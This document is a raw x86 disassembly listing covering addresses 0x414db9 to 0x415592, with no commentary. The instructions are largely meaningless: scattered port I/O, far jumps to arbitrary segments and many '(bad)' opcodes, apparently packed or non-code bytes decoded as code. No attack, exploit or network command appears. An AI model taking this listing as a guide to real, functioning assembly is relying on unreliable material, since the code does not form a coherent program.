  414db9:	mov    ds:0xc0479b9,eax
  414dbe:	sar    DWORD PTR [ecx+esi*2+0x493f3220],0xbe
  414dc6:	test   ebx,0x9f6c189
  414dcc:	neg    DWORD PTR ds:0x997fdcc2
  414dd2:	paddusw mm2,mm5
  414dd5:	je     0x414de0
  414dd7:	sbb    edx,DWORD PTR [ebp-0x4e3c6109]
  414ddd:	in     eax,0x50
  414ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414de0:	clc    
  414de1:	inc    ebx
  414de2:	push   0x7d
  414de4:	inc    DWORD PTR [edx-0x2c]
  414de7:	shr    DWORD PTR [esi+0x2e],1
  414dea:	cmp    BYTE PTR [esi],dl
  414dec:	pop    esp
  414ded:	mov    al,0x3e
  414def:	pop    eax
  414df0:	aad    0x77
  414df2:	inc    ebp
  414df3:	jmp    0x414dd8
  414df5:	out    dx,eax
  414df6:	ins    DWORD PTR es:[edi],dx
  414df7:	mov    edi,0x68064dea
  414dfc:	xchg   ebp,eax
  414dfd:	sub    eax,0xf36bd79
  414e02:	loope  0x414db4
  414e04:	cmp    edi,edx
  414e06:	sbb    eax,0x6fa44dd5
  414e0b:	and    al,0x6f
  414e0d:	sti    
  414e0e:	pop    es
  414e0f:	int3   
  414e10:	jo     0x414df6
  414e12:	sbb    DWORD PTR [esi+0x4707781e],esi
  414e18:	xchg   BYTE PTR [edi-0x13],bl
  414e1b:	xchg   ecx,eax
  414e1c:	mov    ds:0x6e006f9b,al
  414e21:	arpl   WORD PTR [ebx-0x53],ax
  414e24:	fmul   DWORD PTR [edi+0x4d]
  414e27:	pop    ebx
  414e28:	(bad)  
  414e29:	dec    edi
  414e2b:	sub    bl,BYTE PTR [edx-0x6c]
  414e2e:	cmc    
  414e2f:	leave  
  414e30:	sbb    edx,DWORD PTR [esi]
  414e32:	cmp    al,0xad
  414e34:	jmp    0xd33f7cbb
  414e39:	xchg   esi,eax
  414e3a:	dec    edx
  414e3b:	pop    ss
  414e3c:	jle    0x414e6a
  414e3e:	scas   eax,DWORD PTR es:[edi]
  414e3f:	pop    ds
  414e40:	push   es
  414e41:	in     al,dx
  414e42:	rcl    BYTE PTR [ecx+0x7d328789],1
  414e48:	fisubr WORD PTR [ecx-0x77]
  414e4b:	stos   DWORD PTR es:[edi],eax
  414e4c:	mov    ds:0x3dd93cdd,eax
  414e51:	push   esi
  414e52:	ja     0x414e33
  414e54:	push   ds
  414e55:	xchg   ecx,eax
  414e56:	test   DWORD PTR [ebx+0x17],0x8ec77c1c
  414e5d:	inc    ebp
  414e5e:	push   ss
  414e5f:	and    edi,DWORD PTR [eax]
  414e61:	lock cs aad 0xdc
  414e65:	loop   0x414edd
  414e67:	sub    al,0xd6
  414e69:	ins    BYTE PTR es:[edi],dx
  414e6a:	ins    DWORD PTR es:[edi],dx
  414e6b:	xor    al,0x98
  414e6d:	test   eax,0xca6311dd
  414e72:	imul   ecx,DWORD PTR [ecx-0x40],0x2bf41218
  414e79:	mov    ebx,0xe8c4c1e7
  414e7e:	popf   
  414e7f:	jecxz  0x414e67
  414e81:	jnp    0x414e42
  414e83:	sub    ch,BYTE PTR [edx]
  414e85:	push   0x76cd5091
  414e8a:	mov    ecx,0x4450ebc
  414e8f:	pop    ebx
  414e90:	push   esp
  414e91:	mov    ebx,0x6d2ae95a
  414e96:	ins    DWORD PTR es:[edi],dx
  414e97:	add    bl,BYTE PTR [eax]
  414e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e9a:	ret    0x301b
  414e9d:	push   edx
  414e9e:	mov    cl,0x50
  414ea0:	std    
  414ea1:	xchg   edi,eax
  414ea2:	jb     0x414e8f
  414ea4:	enter  0x1736,0xc
  414ea8:	out    dx,al
  414ea9:	xchg   ebx,eax
  414eaa:	inc    ebp
  414eab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eac:	cmp    ebp,DWORD PTR [edx+ecx*1+0x6a208bff]
  414eb3:	out    0xc1,eax
  414eb5:	clc    
  414eb6:	xchg   esi,eax
  414eb7:	adc    ecx,DWORD PTR [eax+0x16]
  414eba:	aad    0xa9
  414ebc:	mov    ds:0xfb31328f,eax
  414ec1:	sub    DWORD PTR ds:0xc64e9dc5,ebp
  414ec7:	pop    edx
  414ec8:	push   edi
  414ec9:	mov    dl,BYTE PTR [eax]
  414ecb:	adc    BYTE PTR [edx+0xbf2f431],dl
  414ed1:	inc    esi
  414ed2:	adc    DWORD PTR [esi-0x1c5e19a4],ebx
  414ed8:	mov    dh,0x82
  414eda:	cli    
  414edb:	mov    DWORD PTR [ebx-0x4879a17f],edx
  414ee1:	in     eax,dx
  414ee2:	mov    ebx,0x4e4a36b
  414ee7:	ror    BYTE PTR [ecx-0x5a],0x46
  414eeb:	mov    ecx,0x6e874b3c
  414ef0:	cmp    BYTE PTR [edi+0x68],bl
  414ef3:	fdiv   DWORD PTR [eax-0x49e90ac7]
  414ef9:	sub    BYTE PTR [esi+esi*8+0x4f],cl
  414efd:	addr16 cld 
  414eff:	out    dx,al
  414f00:	add    BYTE PTR [eax-0x62],ah
  414f03:	mov    ebp,0xec2e5be
  414f08:	stos   BYTE PTR es:[edi],al
  414f09:	adc    eax,0x439f5d3
  414f0e:	push   0x79
  414f10:	cwde   
  414f11:	call   0x1d53:0x285efbd6
  414f18:	test   dl,cl
  414f1a:	int3   
  414f1b:	loope  0x414ef5
  414f1d:	out    dx,al
  414f1e:	cld    
  414f1f:	mov    bh,0x4a
  414f21:	repz add al,0x55
  414f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f25:	jecxz  0x414ec6
  414f27:	add    ah,BYTE PTR [eax+0x7b]
  414f2a:	jecxz  0x414f68
  414f2c:	push   ebp
  414f2d:	les    ecx,FWORD PTR [edx+0x1462d3d4]
  414f33:	adc    eax,0x64464141
  414f38:	lds    eax,FWORD PTR [edx+0x7e457529]
  414f3e:	not    DWORD PTR [esi-0x7b]
  414f41:	pop    esi
  414f42:	inc    esp
  414f43:	adc    BYTE PTR [esi],al
  414f45:	adc    ah,dl
  414f47:	aas    
  414f48:	ret    
  414f49:	jg     0x414f8b
  414f4b:	out    dx,al
  414f4c:	pop    ss
  414f4d:	jp     0x414ef7
  414f4f:	add    al,0x1c
  414f51:	dec    ecx
  414f52:	jb     0x414f15
  414f54:	xchg   ecx,eax
  414f55:	loop   0x414f3f
  414f57:	sbb    DWORD PTR [edi-0x141b49a1],0xffffffcb
  414f5e:	mov    ch,0x2b
  414f60:	add    eax,0xc829d492
  414f65:	mov    al,0x9f
  414f67:	jne    0x414f3d
  414f69:	popf   
  414f6a:	outs   dx,BYTE PTR ds:[esi]
  414f6b:	or     ebp,esp
  414f6d:	mov    bh,0x9d
  414f70:	mov    esp,0x1cac7667
  414f75:	fwait
  414f76:	jnp    0x414f75
  414f78:	add    ebp,DWORD PTR ds:0x6d5dde3f
  414f7e:	dec    ebp
  414f7f:	push   ds
  414f80:	leave  
  414f81:	push   ebx
  414f82:	inc    ebp
  414f83:	lds    ecx,FWORD PTR [esi+0x16]
  414f86:	or     DWORD PTR [ecx],ecx
  414f88:	jns    0x415003
  414f8a:	(bad)  
  414f8b:	(bad)  
  414f8c:	mov    es,WORD PTR [edx-0x20]
  414f8f:	(bad)  ss:[edi]
  414f92:	cmc    
  414f93:	mov    WORD PTR [ebp+0x58],es
  414f96:	add    BYTE PTR [ecx],al
  414f98:	add    eax,0xaee76022
  414f9d:	ret    
  414f9e:	cmp    ah,BYTE PTR [ebx+eiz*4+0x41561fd9]
  414fa5:	je     0x414f3d
  414fa7:	lds    edi,FWORD PTR ds:0x9b1be75f
  414fad:	lahf   
  414fae:	xor    al,0xfb
  414fb0:	add    al,0x51
  414fb2:	pop    eax
  414fb3:	mov    al,ds:0xb4aad8dc
  414fb8:	fmul   DWORD PTR [edi+0x265fc862]
  414fbe:	pushf  
  414fbf:	xor    ecx,esp
  414fc1:	dec    esp
  414fc2:	mov    esp,0xe5ac4dc9
  414fc7:	mov    dh,0xce
  414fc9:	mov    eax,ds:0xe39d1260
  414fce:	mov    cl,cl
  414fd0:	xchg   edi,eax
  414fd2:	xchg   edi,eax
  414fd3:	(bad)  
  414fd4:	imul   eax,DWORD PTR [esi+esi*1],0x62
  414fd8:	mov    ?,WORD PTR [eax]
  414fda:	test   eax,0x53b6191c
  414fdf:	mov    BYTE PTR [esi],bh
  414fe1:	jmp    0x49ac:0xc027831e
  414fe8:	neg    BYTE PTR [eax+0x5237e52c]
  414fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fef:	ror    DWORD PTR [eax-0x37],cl
  414ff2:	rol    DWORD PTR [ebx],1
  414ff4:	inc    bl
  414ff6:	adc    bl,BYTE PTR [eax+0x3fd08020]
  414ffc:	clc    
  414ffd:	cdq    
  414ffe:	popa   
  414fff:	loope  0x414fd0
  415001:	dec    edx
  415002:	jb     0x41507b
  415004:	sbb    DWORD PTR [eax+0x3a4d765f],ebp
  41500a:	xchg   ecx,eax
  41500b:	cld    
  41500c:	mul    DWORD PTR [edx-0x71551476]
  415012:	push   ecx
  415013:	xchg   ebx,eax
  415014:	mov    esp,0x3886d1d6
  415019:	rol    BYTE PTR [eax+edi*2+0x3f],1
  41501d:	cmp    eax,0x5b3f9e4
  415022:	cmp    al,0xd0
  415024:	mov    eax,0x962cac0a
  415029:	cmp    al,BYTE PTR [esi-0x9eedba1]
  41502f:	cli    
  415030:	xchg   ebx,eax
  415031:	mov    edi,0xc7df5d22
  415036:	jb     0x414fe9
  415038:	leave  
  415039:	repnz sbb bh,ch
  41503c:	mov    WORD PTR [edi+0x75696c6a],?
  415042:	inc    eax
  415043:	cmp    ecx,DWORD PTR [edi+0x50]
  415046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415047:	cmp    eax,0x10f9574c
  41504c:	sub    dh,BYTE PTR [esp+ecx*1-0x6a]
  415050:	scas   ax,WORD PTR es:[edi]
  415052:	or     BYTE PTR [ecx-0x6],0x40
  415056:	push   ss
  415057:	cmc    
  415058:	call   0x13e6:0x5a5ccf6f
  41505f:	dec    al
  415061:	jl     0x41507a
  415063:	fidivr DWORD PTR [ebp+0x7487c95c]
  415069:	jno    0x414fee
  41506b:	jmp    0x6fdb3269
  415070:	ds cli 
  415072:	clc    
  415073:	inc    ebp
  415074:	mov    cl,0x1b
  415076:	xchg   edi,eax
  415077:	push   es
  415078:	adc    ch,BYTE PTR [esi-0x3aa931c2]
  41507e:	fs inc ebx
  415080:	jae    0x4150ef
  415082:	mov    ebx,eax
  415084:	clc    
  415085:	xchg   edi,eax
  415086:	cmp    DWORD PTR [eax+0x2d],0xffffff8c
  41508a:	test   DWORD PTR fs:[edx],0x403f9e1d
  415091:	sbb    eax,0xe15b27cc
  415096:	adc    bh,BYTE PTR [eax+eiz*8+0x5c]
  41509a:	push   esi
  41509b:	and    DWORD PTR [edx],0x38
  41509e:	mov    ah,0x18
  4150a0:	leave  
  4150a1:	push   ss
  4150a2:	mov    BYTE PTR [ecx-0x323863fe],bl
  4150a8:	scas   eax,DWORD PTR es:[edi]
  4150a9:	in     eax,0x31
  4150ab:	jg     0x4150d3
  4150ad:	adc    eax,0xec57fa68
  4150b2:	and    BYTE PTR [bp+si+0x59],0x8c
  4150b7:	xchg   edi,eax
  4150b8:	pop    esi
  4150b9:	add    ch,BYTE PTR [eax+0x5f439657]
  4150bf:	add    ebp,DWORD PTR ss:[edi]
  4150c2:	imul   edi,esi,0x56
  4150c5:	jno    0x415112
  4150c7:	xor    esi,ecx
  4150c9:	aas    
  4150ca:	mov    WORD PTR [edi-0x74141b30],gs
  4150d0:	fild   QWORD PTR [edi-0x2056f56]
  4150d6:	add    ax,0xf7e0
  4150da:	mov    ebp,0xa38d9852
  4150df:	xchg   edx,eax
  4150e0:	sub    eax,0x977ce1d9
  4150e5:	ds inc esi
  4150e7:	mov    ch,0x50
  4150e9:	or     ch,bh
  4150eb:	mov    BYTE PTR [edx+0x1],dl
  4150ee:	mov    ebx,0x7ecff34c
  4150f3:	ret    
  4150f4:	ins    BYTE PTR es:[edi],dx
  4150f5:	jo     0x4150d4
  4150f7:	jnp    0x415122
  4150f9:	mov    al,0x98
  4150fb:	pushf  
  4150fc:	les    esp,FWORD PTR [eax]
  4150fe:	pop    edi
  4150ff:	mov    ds:0x279bb158,al
  415104:	in     eax,dx
  415105:	aam    0x1
  415107:	xchg   ebp,eax
  415108:	add    BYTE PTR [ecx+0x7b7212ed],0x28
  41510f:	mov    esp,0x44de798e
  415114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415115:	mov    BYTE PTR [edi+0x21702bd4],dl
  41511b:	(bad)  
  41511c:	jmp    0x41516e
  41511e:	jl     0x415198
  415120:	sahf   
  415121:	sub    eax,0x85ffa7e6
  415126:	cmc    
  415127:	(bad)
  41512a:	or     DWORD PTR [edi],ebx
  41512c:	add    DWORD PTR [edx],ebp
  41512e:	sub    BYTE PTR [edx+0x41],0xae
  415132:	push   0xcd2d14df
  415137:	sub    DWORD PTR [edi-0x35],eax
  41513a:	add    dh,BYTE PTR [ebx]
  41513c:	push   eax
  41513d:	or     BYTE PTR [ebx],al
  41513f:	outs   dx,BYTE PTR ds:[esi]
  415140:	jmp    FWORD PTR [esi-0x59]
  415143:	cwde   
  415144:	stos   DWORD PTR es:[edi],eax
  415145:	pop    ss
  415146:	es mov dl,0x27
  415149:	pusha  
  41514a:	push   eax
  41514b:	pop    ecx
  41514c:	(bad)  
  41514d:	ficom  DWORD PTR [edi-0x80]
  415150:	xlat   BYTE PTR ds:[ebx]
  415151:	mov    dh,0x88
  415153:	test   al,0x66
  415155:	ror    BYTE PTR [edi],cl
  415157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415158:	ins    DWORD PTR es:[edi],dx
  415159:	fcmovnbe st,st(5)
  41515b:	fxch   st(4)
  41515d:	add    DWORD PTR [eax+0x1329368e],edi
  415163:	test   BYTE PTR [edi+0x4697180],ah
  415169:	repz dec ebx
  41516b:	adc    edi,edi
  41516d:	mov    dh,0x6e
  41516f:	in     al,dx
  415170:	pop    es
  415171:	sbb    bp,WORD PTR [ebp+0x5ecff01c]
  415178:	sbb    esp,DWORD PTR [ebx+0x47]
  41517b:	mov    bh,0xf7
  41517d:	xchg   ebx,eax
  41517e:	pop    ebx
  41517f:	xor    eax,0x6d96061
  415184:	lock adc eax,0xbd2ca81f
  41518a:	test   eax,0xeb52826d
  41518f:	sahf   
  415190:	jno    0x41516a
  415192:	cmp    edx,DWORD PTR ds:[eax+ebx*2+0x5c]
  415197:	mov    al,ds:0x13d76fc5
  41519c:	sti    
  41519d:	jns    0x41515a
  41519f:	xchg   ecx,eax
  4151a0:	inc    esp
  4151a1:	and    esi,DWORD PTR [ebx-0x6d]
  4151a4:	and    bl,BYTE PTR [eax-0x1fc045d0]
  4151aa:	iret   
  4151ab:	sbb    eax,0xa0368cb7
  4151b1:	daa    
  4151b2:	or     DWORD PTR [esi+0x65],0xec378242
  4151b9:	out    dx,al
  4151ba:	loop   0x4151cb
  4151bc:	mov    bh,ah
  4151be:	inc    ecx
  4151bf:	das    
  4151c0:	mov    eax,0x422d3426
  4151c5:	pop    ds
  4151c6:	adc    DWORD PTR [ebx-0x6bdead9f],esi
  4151cc:	adc    BYTE PTR [edx],ah
  4151ce:	test   eax,0xd8a8b28b
  4151d3:	stc    
  4151d4:	std    
  4151d5:	or     esi,edx
  4151d7:	push   es
  4151d8:	rcl    ebp,cl
  4151da:	or     ebp,DWORD PTR [ecx]
  4151dc:	xor    eax,0xd6a6b4ed
  4151e1:	xchg   edi,eax
  4151e2:	sbb    esp,ecx
  4151e4:	lea    ecx,[esp+ecx*4]
  4151e7:	sbb    dl,dh
  4151e9:	push   ecx
  4151ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151eb:	(bad)  
  4151ec:	xor    ebp,ebp
  4151ee:	mov    ebp,0xab3d440f
  4151f3:	adc    ecx,DWORD PTR [eax]
  4151f5:	(bad)  
  4151f6:	jne    0x4151ea
  4151f8:	and    ecx,DWORD PTR [esi+eiz*2]
  4151fb:	in     eax,0x99
  4151fd:	adc    DWORD PTR [edx+0x5],0x6e
  415201:	and    bh,dh
  415203:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415205:	retf   
  415206:	popa   
  415207:	or     BYTE PTR [eax+0x5a],dl
  41520a:	ins    DWORD PTR es:[edi],dx
  41520b:	mov    ebp,DWORD PTR [ebp-0xb0e13d0]
  415211:	clc    
  415212:	fidivr DWORD PTR [edx+0x58]
  415215:	gs loope 0x41519e
  415218:	jnp    0x415214
  41521a:	sbb    BYTE PTR [eax-0x704e627],bh
  415220:	pop    esi
  415221:	retf   0xfb86
  415224:	xchg   esi,eax
  415225:	xlat   BYTE PTR ss:[ebx]
  415227:	xor    DWORD PTR [ecx-0x22d2983a],esi
  41522d:	cli    
  41522e:	lahf   
  41522f:	aaa    
  415230:	clc    
  415231:	or     eax,0x47f82cc3
  415236:	popf   
  415237:	mov    BYTE PTR [edi],bh
  415239:	pop    DWORD PTR [ecx]
  41523b:	mov    bh,0x1f
  41523d:	push   ss
  41523e:	xchg   DWORD PTR [edx+eax*1+0x64f47619],edx
  415245:	les    ebp,FWORD PTR [esi+0x278fba35]
  41524b:	(bad)  
  41524c:	sbb    al,0x58
  41524e:	sbb    BYTE PTR [ebx+0x4d],bh
  415251:	push   cs
  415252:	mov    cl,0x13
  415254:	mov    dl,0xf4
  415256:	inc    ebx
  415257:	lahf   
  415258:	out    dx,al
  415259:	dec    eax
  41525a:	jle    0x4152bf
  41525c:	push   ebx
  41525d:	shl    DWORD PTR [ecx],1
  41525f:	pusha  
  415260:	inc    ebp
  415261:	out    dx,al
  415262:	xchg   ebx,eax
  415263:	(bad)  
  415264:	out    dx,al
  415265:	xchg   ebp,eax
  415266:	ins    DWORD PTR es:[edi],dx
  415267:	inc    esi
  415268:	jb     0x4151fd
  41526a:	out    dx,al
  41526b:	popf   
  41526c:	push   edx
  41526d:	and    BYTE PTR [edi],bl
  41526f:	iret   
  415270:	dec    eax
  415271:	sub    eax,0x3215ab70
  415276:	outs   dx,BYTE PTR ds:[esi]
  415277:	loope  0x4152ca
  415279:	sub    eax,0x53b2cd3e
  41527e:	in     eax,dx
  41527f:	loop   0x4152a4
  415281:	dec    eax
  415282:	fdiv   DWORD PTR [edi-0x1355d0c9]
  415288:	mov    esi,0xc2dc65e5
  41528d:	xchg   esi,eax
  41528e:	pop    eax
  41528f:	pusha  
  415290:	sub    BYTE PTR [ebx],0xd8
  415293:	mov    ds:0x4a5e0d77,eax
  415298:	and    eax,0x8331f87a
  41529d:	push   es
  41529e:	cmp    al,0x89
  4152a0:	repz push ecx
  4152a2:	push   ss
  4152a3:	mov    dh,0xda
  4152a5:	pop    ss
  4152a6:	cli    
  4152a7:	fld    QWORD PTR [eax+0xf]
  4152aa:	xchg   ecx,eax
  4152ab:	pop    ss
  4152ac:	or     DWORD PTR [ebp+0x5f],esp
  4152af:	cmp    dl,bh
  4152b1:	shl    BYTE PTR es:0xfada9bc5,0x57
  4152b9:	cmp    BYTE PTR [ecx-0x40],dl
  4152bc:	test   ah,bl
  4152be:	jmp    0x41530c
  4152c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152c1:	or     eax,0xe02fa8a
  4152c6:	jmp    0x9cfd:0xf3ffd8c4
  4152cd:	push   ecx
  4152ce:	mov    eax,0x79bc9b6f
  4152d3:	fmul   st(7),st
  4152d5:	neg    BYTE PTR [eax+0x29]
  4152d8:	mov    DWORD PTR cs:[eax+edx*8],ecx
  4152dc:	pop    edx
  4152dd:	jle    0x415310
  4152df:	jecxz  0x4152d8
  4152e1:	xchg   esi,eax
  4152e2:	addr16 call 0xcb2fbc25
  4152e8:	jmp    0x9161aa0f
  4152ed:	sub    ecx,esi
  4152ef:	mov    al,ds:0xebda2659
  4152f4:	scas   al,BYTE PTR es:[edi]
  4152f5:	or     BYTE PTR [edx-0x2c],bl
  4152f8:	jle    0x415338
  4152fa:	imul   DWORD PTR [ebp-0x5d]
  4152fd:	xchg   ecx,eax
  4152fe:	(bad)  
  4152ff:	push   ss
  415300:	jnp    0x415358
  415302:	jne    0x415352
  415304:	adc    ah,al
  415306:	sti    
  415307:	enter  0x6368,0x90
  41530b:	out    0xb6,eax
  41530d:	mov    al,0x15
  41530f:	mov    eax,ds:0xdd291acb
  415314:	es xchg ecx,eax
  415316:	or     BYTE PTR [edi+0x60],al
  415319:	or     bh,BYTE PTR [esp+esi*2]
  41531c:	fwait
  41531d:	(bad)  
  41531e:	jns    0x41531e
  415320:	dec    ebx
  415321:	push   esp
  415322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415323:	int    0xd3
  415325:	sub    al,0x1b
  415327:	xor    bl,BYTE PTR [eax+0x70352fee]
  41532d:	stos   BYTE PTR es:[edi],al
  41532e:	cmp    esp,DWORD PTR [edi+0x1e]
  415331:	aad    0xd
  415333:	pusha  
  415334:	jmp    0x55f5:0x8c50c7db
  41533b:	add    DWORD PTR [ebp+0xc6d60d],ebp
  415341:	jmp    0xba0e:0x25668cdc
  415348:	lods   al,BYTE PTR ds:[esi]
  415349:	shr    DWORD PTR [eax+ebx*2+0x5b4b9265],1
  415350:	sub    cl,BYTE PTR [edx+eiz*8+0x3b]
  415354:	icebp  
  415355:	sub    BYTE PTR [ebx-0x4b8e61e1],dl
  41535b:	pop    ebx
  41535c:	push   esi
  41535d:	mov    edx,0xf025aace
  415362:	scas   al,BYTE PTR es:[edi]
  415363:	sbb    eax,0x80c801e2
  415368:	jl     0x415377
  41536a:	push   ds
  41536b:	adc    bh,cl
  41536d:	iret   
  41536e:	push   ss
  41536f:	mov    ch,0xe3
  415371:	fiadd  DWORD PTR [edi-0xd]
  415374:	and    BYTE PTR [edi-0x5d4ca723],0x88
  41537b:	pop    ss
  41537c:	inc    esp
  41537d:	mov    WORD PTR ds:0xbc6d2990,ss
  415383:	xchg   BYTE PTR [ebx],bl
  415385:	stc    
  415386:	adc    DWORD PTR [bp+0x788],edi
  41538b:	add    eax,0xdf1e822e
  415390:	(bad)  
  415391:	inc    DWORD PTR [eax*4-0x7be19991]
  415398:	jge    0x415320
  41539a:	dec    edi
  41539b:	sbb    dl,BYTE PTR [ecx-0x42]
  41539e:	or     DWORD PTR [ebx+0x76],ebp
  4153a1:	idiv   DWORD PTR [esi]
  4153a3:	in     eax,0xf
  4153a5:	sub    dh,BYTE PTR [ebx]
  4153a7:	loop   0x41537b
  4153a9:	ds sbb al,0x4f
  4153ac:	rcl    BYTE PTR [esi-0x265839e4],1
  4153b2:	dec    edi
  4153b3:	shr    bl,cl
  4153b5:	loop   0x415436
  4153b7:	ficomp DWORD PTR [edx-0x1f]
  4153ba:	push   es
  4153bb:	les    eax,FWORD PTR [ebx+eax*1-0x6783c089]
  4153c2:	pushf  
  4153c3:	pushf  
  4153c4:	ret    0xe151
  4153c7:	sti    
  4153c8:	ja     0x415372
  4153ca:	pop    eax
  4153cb:	test   al,0xda
  4153cd:	data16 sbb BYTE PTR [edx+0x446ed5c3],dl
  4153d4:	sbb    eax,0x29f40709
  4153d9:	mov    ecx,0x2fd9b8d6
  4153de:	adc    DWORD PTR [edi],0xa7f2a98b
  4153e4:	sbb    BYTE PTR [ebp-0x38],ch
  4153e7:	cmp    eax,0x84b97ab4
  4153ec:	cmp    al,0x3e
  4153ee:	repz and ch,ch
  4153f1:	sub    bl,0x61
  4153f4:	jb     0x415383
  4153f6:	repnz mov bl,0xf5
  4153f9:	in     al,0x73
  4153fb:	shr    bl,1
  4153fd:	mov    DWORD PTR [esi+0x1a],ecx
  415400:	(bad)  
  415402:	cmp    edx,ebp
  415404:	fldenv gs:[ebx-0x35219cec]
  41540b:	xchg   DWORD PTR [ebx-0x5e],edx
  41540e:	mov    ah,0x90
  415410:	lds    esi,FWORD PTR [ebp-0x2e]
  415413:	push   ebp
  415414:	test   eax,0xa66b9a37
  415419:	stc    
  41541a:	xor    al,0xaf
  41541c:	stc    
  41541d:	or     DWORD PTR [eax-0x67df548b],esi
  415423:	lods   eax,DWORD PTR ds:[esi]
  415424:	and    bh,cl
  415426:	shr    DWORD PTR [eax],1
  415428:	out    0xbc,eax
  41542a:	mov    ah,0xea
  41542c:	lahf   
  41542d:	inc    ecx
  41542e:	sahf   
  41542f:	bound  edx,QWORD PTR [esi]
  415431:	jne    0x41543d
  415433:	test   DWORD PTR [ebp+ebx*1-0x52a3f0eb],esi
  41543a:	cli    
  41543b:	(bad)  
  41543d:	test   al,0x9a
  41543f:	inc    edi
  415440:	jb     0x41542a
  415442:	fwait
  415443:	aaa    
  415444:	cmp    bh,ch
  415446:	cwde   
  415447:	fsubr  QWORD PTR [ebx]
  415449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41544a:	repnz inc esi
  41544c:	imul   ecx,DWORD PTR [esi+0x3],0x97116531
  415453:	fs jp  0x41543c
  415456:	imul   ebp,DWORD PTR [ebx-0x575a8483],0x2
  41545d:	jl     0x4153f6
  41545f:	enter  0xebb,0xbe
  415463:	test   DWORD PTR [esp+eiz*2],edx
  415466:	push   0x15
  415468:	add    DWORD PTR [ebx-0x55ad3e0],eax
  41546e:	pushf  
  41546f:	mov    edx,0x90a045ca
  415474:	jmp    0x4154e3
  415476:	cmp    ebp,DWORD PTR [ecx-0x27]
  415479:	dec    esp
  41547a:	imul   esp,esi,0x28
  41547d:	and    al,0x75
  41547f:	data16 or BYTE PTR [edi+0x9],dl
  415483:	(bad)
  415487:	dec    DWORD PTR [ebx]
  415489:	stc    
  41548a:	cli    
  41548b:	lods   eax,DWORD PTR ds:[esi]
  41548c:	retf   0x8b46
  41548f:	add    al,0x65
  415491:	add    ah,dl
  415493:	lock mov bl,0x7c
  415496:	in     al,0x35
  415498:	xor    al,bl
  41549a:	inc    ecx
  41549b:	in     eax,0x3a
  41549d:	dec    esi
  41549e:	loop   0x4154cc
  4154a0:	adc    BYTE PTR [ebp-0x9981489],bh
  4154a6:	(bad)  
  4154a8:	leave  
  4154a9:	mov    ecx,DWORD PTR [esi+0x38]
  4154ac:	fcomi  st,st(0)
  4154ae:	mov    dh,bl
  4154b0:	je     0x415489
  4154b2:	imul   esi,ebx,0x8
  4154b5:	stc    
  4154b6:	or     BYTE PTR [esi],al
  4154b8:	jb     0x415534
  4154ba:	stc    
  4154bb:	pop    ss
  4154bc:	xchg   edi,eax
  4154bd:	mov    ch,0x3
  4154bf:	or     al,0x95
  4154c1:	cmp    eax,0x511059c0
  4154c6:	adc    ah,BYTE PTR [ecx-0x2e]
  4154c9:	jnp    0x41546e
  4154cb:	sub    dh,BYTE PTR [ebx+eiz*4]
  4154ce:	jno    0x41553f
  4154d0:	push   es
  4154d1:	ret    
  4154d2:	pop    es
  4154d3:	aad    0x1f
  4154d5:	jb     0x415461
  4154d7:	pop    es
  4154d8:	in     al,0xc4
  4154da:	jmp    0xeeb2:0xc1754635
  4154e1:	cli    
  4154e2:	in     eax,0x2e
  4154e4:	mov    eax,ds:0x8c71c738
  4154e9:	mov    BYTE PTR [ebp+edi*4-0x487c0368],ch
  4154f0:	add    ebx,eax
  4154f2:	sub    BYTE PTR [ebx],cl
  4154f4:	data16 sahf 
  4154f6:	cmp    ebx,DWORD PTR [ebx-0x5c]
  4154f9:	dec    ebp
  4154fa:	add    BYTE PTR [esi],ch
  4154fc:	or     eax,0xdc8adf4f
  415501:	xor    BYTE PTR [edx],dl
  415503:	mov    ecx,0xe0f9e9cd
  415508:	add    cl,dh
  41550a:	jle    0x4154ee
  41550c:	(bad)
  415510:	xchg   esp,eax
  415511:	imul   BYTE PTR [edi]
  415513:	sbb    ebp,DWORD PTR [eax+0x1f]
  415516:	jg     0x4154b1
  415518:	fsub   QWORD PTR [edi]
  41551a:	or     DWORD PTR [ebx+0x4b],0x69
  41551e:	mov    cl,0x21
  415520:	(bad)  
  415521:	enter  0x3b4a,0x1a
  415525:	out    0x9d,eax
  415527:	mov    eax,0x665586cd
  41552c:	ins    DWORD PTR es:[edi],dx
  41552d:	dec    eax
  41552e:	push   ebp
  41552f:	sbb    esi,DWORD PTR [edx+0x51]
  415532:	xor    dl,bl
  415534:	je     0x415551
  415536:	adc    ch,bl
  415538:	ins    DWORD PTR es:[edi],dx
  415539:	jge    0x4154d6
  41553b:	push   edx
  41553c:	jbe    0x4155b1
  41553e:	push   ds
  41553f:	test   DWORD PTR [edi],ebx
  415541:	gs mov eax,0x4e8d2a2
  415547:	jmp    0xb1aabd59
  41554c:	(bad)  
  41554d:	mov    edx,0xd5207697
  415552:	jg     0x41557b
  415554:	mov    esi,?
  415556:	jnp    0x4155bd
  415558:	mov    bh,0xb0
  41555a:	push   cs
  41555b:	sbb    al,0xd4
  41555d:	stc    
  41555e:	popf   
  41555f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415560:	jae    0x4155b1
  415562:	mov    al,ds:0x4b2ce4b8
  415567:	in     eax,0x19
  415569:	repnz imul esp,edi,0xffffffa2
  41556d:	mov    edi,0x902f11bb
  415572:	setnp  BYTE PTR [esi+0x1f]
  415576:	outs   dx,DWORD PTR ds:[esi]
  415577:	xchg   esi,eax
  415578:	xchg   ebp,eax
  415579:	(bad)  
  41557a:	div    BYTE PTR [eax+0x15c9cb57]
  415580:	fild   WORD PTR [edx+ebp*8-0x4f]
  415584:	lahf   
  415585:	call   DWORD PTR [esi+0x61]
  415588:	and    ecx,DWORD PTR [esi+0x1f]
  41558b:	fcmovu st,st(1)
  41558d:	push   0xc904bd62
  415592:	sub    BYTE PTR [edx+0x56],cl
